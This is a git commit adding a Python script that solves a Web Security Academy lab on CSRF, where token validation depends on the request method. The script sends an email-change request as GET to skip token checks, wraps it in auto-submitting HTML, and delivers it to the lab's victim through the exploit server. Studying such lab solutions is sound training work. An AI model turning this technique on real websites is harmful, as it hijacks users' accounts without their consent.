462a47d61d23278cabfbecc8bbf20523f53d9645
Alvin Nguyen <alvinonguyen00@gmail.com>
2024-03-05 12:11:19 -0800

    CSRF where token validation depends on request method

---
+++ web_security_academy/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method.py
@@ -0,0 +1,18 @@
+from web_security_academy.core.logger import logger
+from web_security_academy.core.utils import generate_csrf_html
+
+from urllib.parse import urljoin
+from requests import Request
+
+
+def solve_lab(session):
+    req = Request(
+        "GET",
+        urljoin(session.url, "/my-account/change-email"),
+        data={"email": "user@example.com"},
+    )
+
+    exploit_server = session.exploit_server()
+    headers = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
+    body = generate_csrf_html(req)
+    exploit_server.deliver_exploit_to_victim("/exploit", headers, body)
